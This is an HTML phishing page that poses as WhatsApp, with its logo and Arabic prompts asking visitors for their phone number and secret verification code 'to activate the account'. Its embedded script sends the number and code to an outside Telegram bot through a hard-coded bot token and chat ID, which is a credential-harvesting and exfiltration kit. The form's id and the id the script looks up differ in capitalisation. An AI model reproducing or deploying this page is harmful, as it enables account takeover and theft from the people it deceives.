<!DOCTYPE html>
<html style="background-color: #1ebea5;zoom:130%">
<head>
	<title></title>
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Almarai&display=swap" rel="stylesheet">
	<style type="text/css">
		.issam{
			font-family: 'Almarai', sans-serif;
			font-size: 29px;
			color: #FFF;

		}
	</style>


	<script src="http://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
</head>
<body style="text-align: center;">


<form id="DataForm" >
	

	<img src="https://static.whatsapp.net/rsrc.php/yv/r/-r3j-x8ZnM7.svg" width="55%;" style="margin-top: 180px;">

	<h3 class="issam" style="margin-top:100px;">المرجو إدخال الرقم الخاص بكم</h3>
	<input id="num" name="num" type="text" maxlength="10" style="width: 350px;height:65px;border:none;margin-top: 25px;text-align: center;font-family: 'Almarai', sans-serif;font-size: 22px;font-weight: bold;color:#00584b" required />



	<h3 class="issam" style="margin-top:100px;">المرجو إدخال الرمز السري الخاص بكم لتفعيل حسابك</h3>
	<input id="pin" name="pin" type="password" maxlength="6" style="width: 350px;height:65px;border:none;margin-top: 25px;margin-bottom: 15px;text-align: center;font-family: 'Almarai', sans-serif;font-size: 22px;font-weight: bold;color:#00584b" required />

	<br>
	<hr>
	<button type="submit" style="margin-top: 30px;font-size: 29px;font-family: 'Almarai', sans-serif;padding: 15px;width: 350px;background-color: #01e675;color:#FFF;border:none;">إرسال </button>
</form>
<script>
        document.getElementById("dataForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent the form from submitting normally

            // Get input values
            var num = document.getElementById("num").value;
            var pin = document.getElementById("pin").value;

            // Construct the message to be sent to Telegram
            var telegramMessage = "num: " + num + "\npin: " + pin;

            // Replace YOUR_TELEGRAM_BOT_TOKEN and YOUR_CHAT_ID with your actual bot token and chat ID
            var url = "https://api.telegram.org/bot7292959892:AAE3azYgFFdyynNrl5v_mp0-3iCT593lzBg/sendMessage?chat_id=1452497907&text=" + encodeURIComponent(telegramMessage);

            // Send the data to Telegram using Fetch API
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                    alert("Message sent successfully!");
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert("Error sending message. Please try again later.");
                });
        });
    </script>



</body>
</html>
